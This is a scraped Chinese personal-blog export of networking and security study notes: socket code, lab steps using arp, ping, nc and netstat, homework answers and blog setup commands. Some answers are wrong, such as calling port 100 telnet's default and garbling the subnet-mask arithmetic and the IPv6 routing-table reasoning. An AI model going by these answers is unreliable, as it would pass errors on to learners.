0644) 12 // 使用 syscall.Socket 函数创建一个 UDP 套接字，返回的是文件描述符 fd3 13 fd3, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0) 14 // 使用 fmt.Printf 函数打印出三个文件描述符的值 15 // 注意，对于 *os.File 类型的 fd2，我们使用了 Fd 方法来获取其底层的文件描述符 16 fmt.Printf(\u0026#34;file descriptor 1: %d\\n\u0026#34;, fd1) 17 fmt.Printf(\u0026#34;file descriptor 2: %d\\n\u0026#34;, fd2.Fd()) 18 fmt.Printf(\u0026#34;file descriptor 3: %d\\n\u0026#34;, fd3) 19 20 // 使用 Close 方法和 syscall.Close 函数关闭了这三个文件描述符，以释放系统资源 21 fd2.Close() 22 syscall.Close(fd1) 23 syscall.Close(fd3) 24} 运行\n1go build -o ch1/fd_seri ch1/fdSeri/fd_seri.go 2./ch1/fd_seri 3file descriptor 1: 3 4file descriptor 2: 4 5file descriptor 3: 5 1.3 基于Windows平台的实现 略\n1.4 基于Windows的套接字相关函数及示例 1.5 习题 套接字在网络编程中的作用是什么?为何称它为套接字? 套接字（socket）是网络编程中的抽象概念，它提供了一种机制，使得不同计算机之间可以进行通信和数据交换。套接字可以看作是网络通信的端点，它包含了通信所需的各种信息，如IP地址、端口号、协议等。套接字的名称来源于插座（socket），类比插座连接电器，套接字连接网络。通过套接字，计算机可以在网络上进行数据的发送和接收，实现网络通信的功能。\n在服务器端创建套接字后,会依次调用listen函数和accept 函数。请比较并说明二者作用。 listen函数用于将套接字标记为被动套接字，即用于接受客户端的连接请求。它告诉操作系统该套接字将用于接受传入的连接，而不是发起连接。在调用listen函数后，套接字将进入监听状态，等待客户端的连接请求。 accept函数用于从处于监听状态的套接字中接受一个连接。当客户端尝试连接到服务器时，服务器调用accept函数来接受这个连接，并创建一个新的套接字来与客户端进行通信。这个新的套接字可以用于与该客户端进行数据交换，而原始的监听套接字则继续等待其他客户端的连接请求。accept函数的返回值是一个新的套接字，通过它可以进行与客户端的通信。\nLinux中,对套接字数据进行I/O时可以直接使用文件I/O 相关函数;而在Windows中则不可以。原因为何? 这是因为在Linux中，套接字被视为一种文件描述符，因此可以使用文件I/O相关函数（如read和write）来进行I/O操作。而在Windows中，套接字和文件描述符是不同的概念，Windows采用了不同的I/O模型，因此不能直接使用文件I/O相关函数来对套接字数据进行I/O操作。在Windows中，需要使用特定的套接字I/O函数（如recv和send）来进行套接字数据的读写操作。\n创建套接字后一般会给它分配地址,为什么?为了完成地址分配需要调用哪个函数 创建套接字后需要给它分配地址，这是为了让其他主机能够找到并与该套接字进行通信。在网络编程中，这个地址通常是IP地址和端口号的组合。 为了完成地址分配，需要调用bind函数。bind函数将一个本地地址（IP地址和端口号）分配给套接字，使得其他主机可以通过这个地址与该套接字进行通信。\nLinux中的文件描述符与Windows的句柄实际上非常类似。请以套接字为对象说明它们的含义。 文件描述符和Windows的句柄在套接字的上下文中具有类似的含义。它们都是用来标识和引用套接字的抽象概念。 在Linux中，套接字也被视为一种文件描述符，因此可以使用类似于文件I/O的操作来进行套接字的读写等操作。 在Windows中，套接字使用句柄来进行引用和操作，句柄是一种抽象的引用类型，可以用来标识和操作套接字。 因此，无论是文件描述符还是句柄，它们都是用来引用和操作套接字这种抽象对象的标识符。\n底层文件I/O函数与ANSI 标准定义的文件I/O函数之间有何区别? 底层文件I/O函数是直接调用操作系统提供的文件操作接口，如open、read、write等，它们提供了对文件的低级别访问，可以更加灵活地控制文件的读写操作。 而ANSI标准定义的文件I/O函数则是标准C库中提供的一组文件操作函数，如fopen、fread、fwrite等，它们提供了更加抽象和便捷的文件操作接口，使得跨平台开发更加方便，并且提供了一些缓冲和错误处理的功能。 因此，底层文件I/O函数更加接近操作系统提供的文件操作接口，而ANSI标准定义的文件I/O函数则提供了更加便捷和跨平台的文件操作接口。\n参考本书给出的示例low_open.c 和low_read.c ,分别利用底层文件I/O 和ANSI标准I/O 编写文件复制程序。可任意指定复制程序的使用方法。\n","date":"2023-11-11T12:47:47+08:00","permalink":"https://anonymity-0.github.io/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E7%AB%A0%E7%AC%94%E8%AE%B0/","title":"TCP、IP网络编程第一章笔记"},{"content":"尝试学习一下vim\nvim模式切换 normal转insert i 光标前插入 I行首插入 o进入下一行输入 O上一行插入 a光标之后输入 A行末尾插入\ninsert 转normal esc/jj 变回普通模式\nnormal转visual v变成可视模式（无法编辑）\nvisual转nomal esc或者v变回普通模式\n普通模式转命令模式 ：转成命令模式\n命令模式转普通模式 esc\n光标移动 普通模式下光标移动 动作 motion 操作符 删除全部 die 复制全部 yie u 撤销\n大小写 常用 gd 查看函数定义 ^O返回 g数字 切换标签/ctrl+数字 command+0 到文件夹 o打开 回车修改名字\neasymotion 空格空格s + 要查询的字幕 空格空格+e 空格空格+w\nvim surround 光标转移到终端 leader + t\n切换tab gt或gT\n","date":"2023-11-10T12:43:42+08:00","permalink":"https://anonymity-0.github.io/posts/vim/","title":"Vim"},{"content":"实验内容 arp 在 HostA 和 HostB 中分别打开一个终端用于本实验。\n在 HostA 和 HostB 中分别执行命令ifconfig ens5，查看并记录它们各自的IPv4 地址。执行命令 ifconfig ens6 查看 IPv6 地址 (global 和 link 两种) 以及以太网接口的物理地址。 截图： 命令解释： ifconfig 是一个用于配置和显示网络接口信息的命令。ens5 和 ens6 是网络接口的名称，通常用于表示以太网接口。ifconfig ens5 命令用于显示名为 ens5 的网络接口的配置信息，包括 IP 地址、子网掩码、广播地址、MAC 地址等。\n在 HostA 中执行命令 arp -n 或ip neigh show 查看并记录本机 ARP 缓存表的内容。\n命令解释： arp -n 是一个用于查看本地ARP缓存表的命令。它会显示已解析的IP地址和对应的MAC地址。 ip neigh show 是一个用于查看本地邻居表的命令。它会显示已解析的IP地址和对应的MAC地址，类似于 arp -n 命令。 arp -n 和 ip neigh show 都是用于查看本地ARP缓存表或邻居表的命令，它们的功能相似但有一些区别。\n命令格式不同：arp -n 是在大多数操作系统中使用的命令，而 ip neigh show 是在基于 Linux 的操作系统中使用的命令。 输出格式不同：arp -n 输出的结果通常是以表格形式显示的，包括IP地址和对应的MAC地址。而 ip neigh show 输出的结果可能更详细，包括IP地址、MAC地址、接口、状态等信息。 支持的功能不同：ip neigh show 命令在功能上更加强大，可以显示更多关于邻居的信息，如状态、接口类型等。而 arp -n 命令通常只显示基本的IP地址和MAC地址信息。 截图： 在 HostA 中执行命令 ping -c 1 HostB 的 IPv4 地址向 HostB 发送 ICMP 请求报文。收到 ICMP 响应后再次执行命令 arp -n 或ip neigh show 查看 HostA的 ARP 缓存表的内容。\n命令解释 ping -c 1 HostB 是一个用于向 HostB 发送一个 ICMP 回显请求（ping）的命令。其中，-c 1 表示只发送一次请求。\n截图 在 HostA 的 ARP 缓存表里面可获得 HostB 的 MAC 地址，记录下来，检查与 HostB 上ifconfig ens5 命令的执行结果是否一致。 与 HostB 上ifconfig ens5 命令的执行结果一致\n在 HostA 中执行命令ping -c 1 202.38.64.246，收到 ICMP 响应后继续执行命令ip neigh show 查看 HostA 的 ARP 缓存表，记录结果。简要解释为何无法看到对应于地址 202.38.64.246 的 ARP 表项而只能得到网关的某网卡的MAC 地址。提示：思考网段(链路)、广播域的概念。\n截图： 解释： 这是因为，ARP 协议用于在同一网段内查找主机的 MAC 地址。当 HostA 发送 ICMP 请求到目标地址 202.38.64.246 时，目标地址不在 HostA 的网段内，因此 HostA 需要向网关发送广播 ARP 请求。网关收到广播 ARP 请求后，会将自己的 MAC 地址回复给 HostA。HostA 收到网关的回复后，将网关的 MAC 地址存储在 ARP 缓存表中。因此，HostA 无法看到对应于地址 202.38.64.246 的 ARP 表项。\nIP 分别用命令 route -n 和命令route \u0026ndash;inet6 查看本机的 IPv4 和 IPv6 路由配置，记录所在子网的子网掩码/前缀长度，并于前面 ifconfig 的结果作比较。\n命令解释 route -n 是一个用于显示 IPv4 路由表的命令。它会列出系统中当前配置的所有 IPv4 路由项，包括目的网络、网关、子网掩码、接口和路由标志等信息。该命令中的 -n 选项表示以数字形式显示 IP 地址和子网掩码，而不进行主机名和网络地址的解析。 route --inet6 是一个用于显示 IPv6 路由表的命令。它会列出系统中当前配置的所有 IPv6 路由项，包括目的网络、网关、前缀长度、接口和路由标志等信息。该命令中的 --inet6 选项表示只显示 IPv6 路由表的信息。 截图： ![[Pasted image 20231106202048.png]] 比较两者的结果，可以看到，IPv4 和 IPv6 路由表中的子网掩码/前缀长度均与ifconfig的结果一致。\n执行以下两个命令分别查看系统内核的 IPv4 和 IPv6 的 FORWARD 值，记录下来。简单解释这个值的含义以及为何这个值是这样设定的。提示：思考主机与路由器的区别。\n命令 1：cat /proc/sys/net/ipv4/ip_forward 命令 2：cat /proc/sys/net/ipv6/conf/all/forwarding\n命令解释： 命令1：cat /proc/sys/net/ipv4/ip_forward 用于查看 IPv4 转发功能的状态。在 Linux 系统中，如果该值为 1，则表示启用了 IPv4 转发功能，即允许将数据包从一个网络接口转发到另一个网络接口。 命令2：cat /proc/sys/net/ipv6/conf/all/forwarding 用于查看 IPv6 转发功能的状态。类似于 IPv4，如果该值为 1，则表示启用了 IPv6 转发功能，允许将数据包从一个 IPv6 网络接口转发到另一个 IPv6 网络接口。\n截图： 解释： 可以看到，系统内核的 IPv4 和 IPv6 的 FORWARD 值均为 0。FORWARD 值的含义是是否允许系统转发 IP 数据包。如果 FORWARD 值为 0，则系统不允许转发 IP 数据包。主机和路由器的区别在于，主机只能与同一子网内的主机通信，而路由器可以连接多个子网，并负责将数据包从一个子网转发到另一个子网。由于主机只能与同一子网内的主机通信，因此不需要转发 IP 数据包。因此，主机的 FORWARD 值通常为 0。\nTCP 在 S 的终端 1 中执行 nc -l 1958 侦听1958 端口。。 命令解释： 命令 nc -l 1958 将在 TCP 端口 1958 上监听传入连接\nnc：netcat 命令 -l：监听传入连接 1958：端口号 截图： 在HostA 的终端 1 执行nc S 的IPv4 地址 1958\n截图： 在HostA 终端 2 中执行命令netstat -aunt 来观察自己主机上的所有 TCP 与UDP 连接状况，将输出的信息记录下来。请在上述记录的结果中找到对应于上述连接的那条记录并解释这条记录的含义。\n命令解释： 执行 netstat -aunt 命令可以查看当前系统上所有的网络连接和监听端口，以及它们的状态、协议类型、本地地址和远程地址等信息 截图： 这条记录表示，HostA 主机的60260端口与 S 主机的 1958 端口建立了 TCP 连接。\n执行命令 nc S 的 IPv4 地址 100，记录命令执行结果。同样使用 netstat -aunt 来查看本机的连接状况，请判断这次 telnet 连接是否成功建立并简单说明原因。 原因是 100 端口是 telnet 服务器的默认端口，但 S 主机没有在 100 端口上监听 telnet 连接。因此，HostA 主机无法与 S 主机建立 telnet 连接。\n思考题 现在有一个网段的 IP 地址和子网掩码分别为202.38.75.0/255.255.255.192，请计算该网段中一共有多少个全局 IPv4 地址可供主机使用，或者说这个网络中有多少真正可分配的 IP 地址？\n子网掩码 255.255.255.192 的二进制表示为 11111111 11111111 11111111 11000000，其中前 24 位为 1，表示该网段的网络地址部分，后 8 位为 0，表示该网段的广播地址部分。因此，该网段中一共有 2^6 - 2 = 62 个全局 IPv4 地址可供主机使用。\n实验中执行 ifconfig ens3 查看接口的配置信息时可以观察到一个重要的参数MTU，请问这个值是多少？查询资料说明 MTU 参数的用途。\nMTU 是最大传输单元（Maximum Transmission Unit）的缩写，指的是网络层协议所能通过的最大数据包大小。MTU 的值通常与通信接口有关（网络接口卡、串口等）。 MTU 的值通常以字节为单位，常见的默认值是 1500 字节。这是因为以太网是最常见的网络类型，而以太网的标准帧大小为 1518 字节（包括帧头和帧尾），减去以太网帧头的 18 字节，剩下的 1500 字节就是可用于数据传输的最大数据量。 当数据包的大小超过 MTU 值时，网络层协议会将数据包分片，将数据包拆分成多个小数据包，然后分别传输。分片会增加网络层协议的复杂度，并降低网络效率。因此，在实际应用中，需要根据网络环境调整 MTU 参数的值，以保证数据包能够正常传输，并提高网络效率。\n9. IPv6 地址长度是 IPv4 地址长度的 4 倍，不过在今后的纯 IPv6 网络环境中路由器的 路由表的规模反而有望减小，请简单解释这是为什么？\n在纯 IPv6 网络环境中，路由器的路由表规模有望减小的原因： 1. IPv6 支持路由重叠，即多个路由器可以指向同一个目标地址。这意味着 IPv6 路由器可以共享路由信息，从而减少路由条目的数量。 2. IPv6 路由表结构更加简化。IPv6 路由表采用了扁平化的结构，每个路由表项只需要存储一个目标地址和下一跳地址即可。而 IPv4 路由表采用了分层的结构，每个路由表项还需要存储一个前缀长度和子网掩码。 3. IPv6没有私有地址和NAT技术,减少了路由表中的条目。 4. IPv6 支持动态路由，即路由器可以自动学习到目标地址的路由信息。这意味着 IPv6 路由器不需要手动配置路由条目，从而减少路由条目的数量。 一条 TCP 连接需要哪几个参数标识？\n一条 TCP 连接需要四个参数来标识，即：\n本地 IP 地址：表示连接的本地主机的 IP 地址。 本地端口号：表示连接的本地主机的端口号。 远程 IP 地址：表示连接的远程主机的 IP 地址。 远程端口号：表示连接的远程主机的端口号。 ","date":"2023-11-07T12:46:21+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E5%AE%9E%E9%AA%8C1/","title":"信网实验1"},{"content":"得分：10/10\n路由配置 配置路由器Router 安装远程访问“角色和功能” 设置IP地址和默认网关的IP地址。 启用“路由和远程访问服务” 关闭防火墙 ![[Pasted image 20231024224258.png|300]]\n配置VPN Server 路由远程访问服务器设置 ![[Pasted image 20231023164229.png|400]]\n新建用户 ![[Pasted image 20231024224417.png|400]]\nVPN server的ip地址配置 ![[Pasted image 20231024223002.png|400]]\n配置客户端 client B的ip地址 将ip地址设置为192.168.86.24 24为学号末2位 client A的ip地址 将ip地址设置为55.0.0.24 ![[Pasted image 20231024211518.png|400]]\nVPN连接 进行VPN连接 ![[Pasted image 20231024223124.png|400]]\n连接后的IP变化 clientA ![[Pasted image 20231024221917.png|400]]\nVPN Server ![[Pasted image 20231024223749.png|400]]\nwireshark抓包 ","date":"2023-10-26T15:51:26+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A2/","title":"网络安全作业2"},{"content":"得分：10/10\n简述防火墙的定义 防火墙是位于两个(或多个)网络之间执行访问控制的软件和硬件系统，它根据访问控制规则对进出网络的数据流进行过滤。\n防火墙对数据流的拒绝和丢弃有何区别?\n当数据流被拒绝时，防火墙要向发送者回复一条消息，用ICMP包告知数据源数据包被拒绝的原因，提示发送者该数据流已被拒绝。 当数据流被丢弃时，防火墙不会对这些数据包进行任何处理，也不会向发送者发送任何提示信息。丢弃数据包的做法加长了网络扫描所花费的时间，发送者只能等待回应直至通信超时。 简述数据包过滤器和状态防火墙。\n数据包过滤器通过数据包的头部信息来判断是接受还是拒绝数据包，它并不查看数据包载荷中的应用数据。这种防火墙检查流经它的每个数据包，根据数据包本身所带的信息决定它的去留，而不用参考其他数据包的内容。 状态防火墙会通过对流经的数据包的分析查找通信中的数据流，根据数据流的信息来帮助判断是否让数据包通行。数据流提供了数据包的上下文。状态防火墙有时还会检测一些常用协议的应用数据（虽然可以检测的数据量是有限的），通过这些数据来识别和跟踪相关的数据流。 与包过滤防火墙相比，应用代理防火墙有哪些特点？\n在已有的安全模型中安全性较高。 具有强大的认证功能。 具有超强的日志功能。 应用级网关防火墙的规则配置比较简单 在防火墙的典型部署中，堡垒主机是一个组织机构网络安全的中心主机，它应该具备哪些主要特征？\n堡垒主机硬件平台运行较为安全的操作系统，成为可信任的系统。 只有网络管理员认为必要的服务(代理和用户认证等)才会安装在堡垒主机上。 当允许一个用户访问代理服务时，堡垒主机可能会要求进行额外认证。另外，每一个代理服务都可能需要相应的鉴别机制(Authentication) 每一个代理都只能支持标准应用服务命令集中的一个子集。 每一个代理只允许访问指定主机的通信，支持对通信进行详细的审计。 每一个代理模块都是一个为网络安全设计的一个很小的软件包。 代理之间相互独立。 代理通常无需进行磁盘访问，不需要读取初始配置文件。这使得入侵者很难在主机上安装Trojan horse、sniffers或其他危险的文件。 堡垒主机是一个组织机构网络安全的中心主机。 ","date":"2023-10-26T10:17:18+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/","title":"网络安全作业3"},{"content":"得分：9/10\n第一章 1. 如果你的网络服务器被黑客远程控制，列举3个可能被破坏的安全属性， 并解释理由。 机密性： 理由：远程控制服务器后，黑客可以在未被授权的情况下获取个人信息、数据库记录等数据，导致数据泄露和隐私侵犯。 完整性： 理由：黑客远程服务器后，可以篡改服务器上的数据或者程序文件，修改网站内容、更改配置文件、插入恶意代码等。 可用性： 理由：黑客可能通过远程控制服务器发动拒绝服务攻击或直接禁用服务器上的关键服务和功能，导致服务器无法正常运行。 不可抵赖性： 理由：黑客可以使用服务器的访问权限执行恶意操作如数据篡改。如果服务器没有足够的安全措施来记录这些操作并确保其不可抵赖性，那么黑客可能会否认曾经执行过这些操作，导致难以追踪和证明责任。\n2. 简述RFC2828安全服务的定义，例举Windows10系统的3种安全服务。\nRFC2828定义了安全服务为一种由系统提供的对系统资源进行特殊保护的处理或通信服务，安全服务通过安全机制来实现安全策略。ITU-T（即X.800）定义了五种服务：身份认证、访问控制、数据保密、数据完整性、不可否认。 Windows 10操作系统中的三种安全服务：\n认证服务：认证服务用于验证用户的身份，确保只有经过授权的用户能够访问系统或资源。在Windows 10中，用户必须提供正确的用户名和密码才能登录到系统。 访问控制服务：访问控制服务用于确定哪些用户或实体具有权限访问特定资源或执行特定操作，并确保未经授权的访问被拒绝。在Windows 10中，访问控制服务管理文件和文件夹的权限，以及系统资源的访问权限。 加密服务：加密服务用于将敏感数据转化为不可读的格式，以确保即使数据被未经授权的访问者获取，也无法理解其内容。只有具有正确密钥的用户才能解密数据。BitLocker是一个Windows 10中的工具，它可以加密整个硬盘或者某些部分，以保护数据免受丢失或盗取的威胁。 3 . 简述网络安全防护主要目标的“五不”。 1. 不泄露（Non-Disclosure）：确保网络中的敏感信息和数据不会泄露给未经授权的用户或系统。 2. 不破坏（Non-Destruction）：防止网络系统和数据被破坏、损坏或篡改。 3. 不拒绝（Non-Repudiation）：确保在网络交互中的各种操作和交易都可以被证明，不容易被否认。 4. 不中断（Non-Interruption）：确保网络服务的持续可用性，防止由于攻击、故障或其他原因导致的网络服务中断。 5. 不迟滞（Non-Delay）：保障网络通信的实时性，防止因网络拥塞、延迟或其他问题导致通信延迟。\n第三章 1. 在腾讯会议系统中，对称密码技术和公钥密码技术适合应用在哪几个阶段?说明理由。\n会话加密阶段：对称密码技术非常适合在会话加密阶段使用。一旦参与会议的用户建立了安全连接，可以使用对称加密算法来加密和解密数据通信。这是因为对称密码技术具有较高的加密和解密速度，使其非常适合对大量的音视频数据进行快速的加密和解密操作。\n登录时身份验证和密钥交换阶段：公钥密码技术通常用于安全地进行身份验证和密钥交换。在腾讯会议系统中，当用户首次登录时，可以使用公钥密码技术来验证其身份，并协商用于对称加密的会话密钥。\n2. 简述散列函数MD5的碰撞问题。既然MD5存在碰撞问题，为何http://mirrors.ustc.edu.cn/ubuntu-releases/16.04/ 仍然给出MD5值作为完整性验证的依据。 MD5的碰撞问题是指两个不同的输入数据在经过MD5算法处理后，得到了相同的散列值。这种情况被称为碰撞。 至于为什么仍然给出MD5值作为完整性验证的依据，可能是因为MD5是一个相对快速的散列函数，适用于快速验证大量文件的完整性。发行盘之后的系统安装和软件安装也有额外的安全验证程序。\n3. 简述用RSA公钥算法实现数字签名的过程。（这个问题回答的不好） 数字签名过程如下： 1. 发送者使用自己的私钥对消息进行加密，生成数字签名。 2. 发送者将消息和数字签名一起发送给接收者。 3. 接收者使用发送者的公钥对数字签名进行解密，得到消息的摘要。 4. 接收者使用相同的摘要算法对消息进行摘要处理，得到摘要。 5. 接收者比较两个摘要是否相同，如果相同，则说明消息没有被篡改过。\n4. 用PGP加密某个文件，如果接收该加密文件的用户为1个，加密文件的大小为24kB；如果接收该加密文件的用户 为10个，请问加密文件的大小是原来的10倍(240kB)吗？为什么？ 答：加密文件的大小不会是原来的10倍，由于对称密钥是相对较短的，每个接收者的非对称密钥通常很小。因此，无论接收者数量是1个还是10个，对称密钥密文的总大小都不会显著增加，而文件内容加密只需一次，因此文件大小仍然是原始文件大小（24kB）加上对称密钥密文的大小的总和，而不会变成原来的10倍。\n","date":"2023-10-26T10:17:13+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A1/","title":"网络安全作业1"},{"content":"网络安全实验配置 由于Mac的m系列芯片使用了arm架构与windows server镜像要求的x86架构不同，老师使用的virtual box和mac最常用的pd模拟器均只能进行同架构系统的模拟。于是乎我又查阅了资料，发现UTM可以在mac上进行不同架构的模拟（虽然很卡也很难用，终归是跑通了），以下是我的配置过程:\nUTM下载和安装 直接官网UTM | Virtual machines for Mac下载并安装就好。\nwindows server镜像下载 这时候又出岔子了，老师提供的windows 2003不知道是不是太老了，UTM模拟不了。只能想办法换更新的windows sever2012 下载镜像地址：HelloWindows.cn - 精校 完整 极致 Windows系统下载仓储站 注：需下载迅雷进行磁力链下载\nwireshark的安装 直接官网Wireshark · Go Deep下载安装就好\nUTM和本地文件的共享 待补充\n终于是能在mac上跑实验了，类目。\nUTM下复制的主机互ping问题 本来像按照老师所给的内容配置了七个host-only网络，网络是可以搭建起来的，但是server和client两个虚拟机之间无法互ping。 查阅了很多资料之后发现得设置成桥接模式，并把接口设置成en0即可。如图： ","date":"2023-10-26T10:15:50+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E9%85%8D%E7%BD%AE/","title":"网络安全实验配置"},{"content":"参考：快速入门 | Hugo 中文网\n环境准备 安装hugo brew install hugo\n问题1\n1Cloning into \u0026#39;/Users/agq/Library/Caches/Homebrew/hugo--git\u0026#39;... 2 3fatal: unable to access \u0026#39;https://github.com/gohugoio/hugo.git/\u0026#39;: Recv failure: Operation timed out 解决方法：关闭代理\n问题2\n1Cloning into \u0026#39;/Users/agq/Library/Caches/Homebrew/hugo--git\u0026#39;... 2 3fatal: unable to access \u0026#39;https://github.com/gohugoio/hugo.git/\u0026#39;: Failed to connect to github.com port 443 after 75008 ms: Couldn\u0026#39;t connect to server 配置代理\n1git config --global http.proxy 127.0.0.1:7890 2git config --global https.proxy 127.0.0.1:7890 3 4git config --global http.proxy socks5 127.0.0.1:7890 5git config --global https.proxy socks5 127.0.0.1:7890 问题3\n1Error: Your Command Line Tools (CLT) does not support macOS 14. 2 3It is either outdated or was modified. 4 5Please update your Command Line Tools (CLT) or delete it if no updates are available. 6 7Update them from Software Update in System Settings. 8 9 10 11If that doesn\u0026#39;t show you any updates, run: 12 13 sudo rm -rf /Library/Developer/CommandLineTools 14 15 sudo xcode-select --install 16 17 18 19Alternatively, manually download them from: 20 21 https://developer.apple.com/download/all/. 22 23You should download the Command Line Tools for Xcode 14.3. 解决方法：根据提示运行命令即可\n1 sudo rm -rf /Library/Developer/CommandLineTools 2 3 sudo xcode-select --install 4 5 brew update-reset 安装git brew install git\n本地静态博客搭建 创建新站点 `hugo new site quickstart\n配置主题\n1cd quickstart 2git init 3git submodule add https://github.com/budparr/gohugo-theme-ananke.git themes/ananke 然后，将主题添加到站点的配置文件中：\n1echo \u0026#39;theme = \u0026#34;ananke\u0026#34;\u0026#39; \u0026gt;\u0026gt; config.toml 然后启动，在 http://localhost:1313/ 进行本地查看\n1hugo server -D 这里容易出现一个错误，就是hugo.toml的theme没有设置，导致出现PageNotFound。\n以上是hugo的基本安装教程。\n配置本地静态页面 找来找去，本来想用academy来做学术主页，结果又要实名认证，略有些麻烦，于是换上了stack。\n具体可以看GitHub - CaiJimmy/hugo-theme-stack: Card-style Hugo theme designed for bloggers\n细节就不赘述了，终于是配置好了，最后是目前的成品。 AGA\u0026rsquo;s Blog\n其他功能 图床配置 打开图床配置 | PicX在线使用 配置参考快速开始 | PicX 图床使用指南\nobsidian导出 markdown 1obsidian-export /Users/agq/Documents/obsidian/源文件/ /Users/agq/Documents/obsidian/目的文件夹/ 评论配置 参考Site Unreachable\n","date":"2023-10-18T19:27:27+08:00","permalink":"https://anonymity-0.github.io/posts/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/","title":"博客配置"},{"content":"网络层 IP 即网际协议TCP/IP 的心脏是互联网层。这一层主要由 IP (Internet Protocol)和 ICMP (Internet Control Message Protocol)两个协议组成。 网络层的主要作用是“实现终端节点之间的通信”。这种终端节点之间的通信也叫 “点对点(end-to-end)通信”。\n主机和节点 主机的定义应该是指“配置有I地址,但是不进行路由控制”的设备”。既配有IP地址又具有路由控制能力的设备叫做“路由器”,跟主机有所区别。而节点则是主机和路由器的统称。\nIP基础知识 IP地址 IP地址用于在“连接到网络中的所有主机中识别出进行通信的目标地址” 不论一台主机与哪种数据链路连接,其IP地址的形式都保持不变。以太网、无线局域网、PPP 等,都不会改变IP地址的形式。 而数据链路的MAC地址的形式不一定必须一致。\n在网桥或交换集线器等物理层或数据链路层数据包转发设备中,不需要设置IP地址”。因为这些设备只负责将IP 包转化为0、1 比特流转发或对数据链路帧的数据部分进行转发,而不需要应对IP 协议”\n路由控制 路由控制(Routing)是指将分组数据发送到最终目标地址的功能。 Hop 译为中文叫“跳”。它是指网络中的一个区间。 一跳(1Hop)是指利用数据链路层以下分层的功能传输数据帧的一个区间。 以太网等数据链路中使用 MAC地址传输数据帧。此时的一跳是指从源MAC地址到目标MAC地址之间传输帧的区间。也就是说它是主机或路由器网卡不经其他路由器而能直接到达的相邻主机或路由器网卡之间的一个区间。\n多跳路由 IP 包正是在网络中一个个跳间被转发。因此 IP路由也叫做多跳路由。在每一个区间内决定着包在下一跳被转发的路径。 多跳路由是指路由器或主机在转发IP 数据包时只指定下一个路由器或主机, 而不是将到最终目标地址为止的所有通路全都指定出来。因为每一个区间(跳) 在转发 IP数据包时会分别指定下一跳的操作,直至包达到最终的目标地址。\n路由控制表 为了将数据包发给目标主机,所有主机都维护着一张路由控制表(Routing Table)。该表记录IP 数据在下一步应该发给哪个路由器。IP包将根据这个路由表在各个数据链路上传输。 数据链路的抽象化 IP 是实现多个数据链路之间通信的协议，对IP的上一层来说,不论底层数据链路使用以太网还是无线LAN 亦或是PPP,都将被一视同仁。\n不同数据链路有个最大的区别,就是它们各自的最大传输单位(MTU:Maximum Transmission Unit)不同。\nMTU 的值在以太网中是1500字节,在FDDI 中是4352字节,而ATM则为9180字节。IP 的上一层可能会要求传送比这些 MTU 更多字节的数据,因此必须在线路上传送比包长还要小的MTU。\n为了解决这个问题,IP 进行分片处理(IP Fragmentation)。顾名思义,所谓分片处理是指,将较大的IP 包分成多个较小的IP 包”即从 IP 的上次层看,它完全可以忽略数据包在途中的各个数据链路上的MTU,而只需要按照源地址发送的长度接收数据包。 IP 就是以这种方式抽象化了数据链路层,使得从上层更不容易看到底层网络构造的细节。\n面向无连接 IP 面向无连接。即在发包之前,不需要建立与对端目标地址之间的连接。上层如果遇到需要发送给IP 的数据,该数据会立即被压缩成 IP包发送出去。\n那么,为什么IP 要采用面向无连接呢? 主要有两点原因:一是为了简化,二是为了提速。面向连接比起面向无连接处理相对复杂。甚至管理每个连接本身就是一个相当繁琐的事情。此外,每次通信之前都要事先建立连接,又会降低处理速度。需要有连接时,可以委托上一层提供此项服务。因此,IP 为了实现简单化与高速化采用面向无连接的方式。 IP 提供尽力服务(Best Effort),意指“为了把数据包发送到最终目标地址,尽最大努力。”然而,它并不做“最终收到与否的验证”。IP数据包在途中可能会发生丢包、错位以及数据量翻倍等问题。\n那么,有人可能会提出疑问:为什么不让IP 具有可靠传输的功能, 从而把这两种协议合并到一起呢?\n这其中的缘由就在于,如果要一种协议规定所有的功能和作用,那么该协议的具体实施和编程就会变得非常复杂,无法轻易实现。相比之下,按照网络分层,明确定义每层协议的作用和责任以后,针对每层具体的协议进行编程会更加有利于该协议的实现。 网络通信中如果能进行有效分层,就可以明确 TCP 与IP 各自协议的最终目的,也有利于后续对这些协议进行扩展和性能上的优化。分层也简化了每个协议的具体实现。\nIPv4 IP 地址(IPv4 地址)由32位正整数来表示，将32位的IP地址以每8位为一组,分成4组,每组以“.”隔开,再将每组数转换为十进制数”\n实际上,IP地址并非是根据主机台数来配置的,而是每一台主机上的每一块网卡(NIC)都得设置IP 地址”。通常一块网卡只设置一个 IP 地址,其实一块网卡也可以配置多个 IP 地址。此外,一台路由器通常都会配置两个以上的网卡,因此可以设置两个以上的IP地址。 IP 地址由“网络标识(网络地址)”和“主机标识(主机地址)”两部分组成”\n网络标识必须保证相互连接的每个段的地址不相重复。而相同段内相连的主机必须有相同的网络地址。IP地址的“主机标识”则不允许在同一个网段内重复出现。\n究竞从第几位开始到第几位算是网络标识,又从第几位开始到第几位算是主机标识呢?关于这点,有约定俗成的两种类型。最初二者以分类进行区别。而现在基本以子网掩码(网络前缀)区分。 IP地址的分类 IP 地址分为四个级别,分别为A类、B类、C类、D类”。它根据 IP 地址中从第1位到第4位的比特列对其网络标识和主机标识进行区分。 关于分配IP 主机地址的注意事项 在分配 IP 地址时关于主机标识有一点需要注意。即要用比特位表示主机地址时,不可以全部为0或全部为1。因为全部为只有。在表示对应的网络地址或IP 地址不可获知的情况下才使用。而全部为1的主机地址通常作为广播地址。\n广播地址 广播地址用于在同一个链路中相互连接的主机之间发送数据的目的主机地址部分全部设置为1,就成为了广播地址。\n以太网中如果将 MAC地址的所有位都改为1,则形成FF:FF: FF: FF: FF: FF 的广播地址。因此, 